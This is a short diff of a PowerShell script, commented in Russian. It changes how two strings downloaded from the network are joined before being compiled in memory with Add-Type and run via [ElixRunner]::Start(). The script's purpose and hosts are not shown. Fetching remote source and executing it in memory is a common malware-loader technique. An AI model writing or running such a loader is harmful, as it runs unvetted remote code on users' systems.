@@ -12,9 +12,11 @@ try {
     $c2 = $web.DownloadString($uri2)
 
     if ($c1 -and $c2) {
-        # Передаем обе переменные как массив через запятую.
-        # PowerShell сам корректно обработает их при компиляции.
-        Add-Type -TypeDefinition $c1, $c2
+        # Используем специальный символ переноса строки PowerShell `n внутри двойных кавычек
+        $fullCode = $c1 + "`n" + $c2
+        
+        # Передаем итоговую объединенную строку
+        Add-Type -TypeDefinition $fullCode
 
         [ElixRunner]::Start()
     }
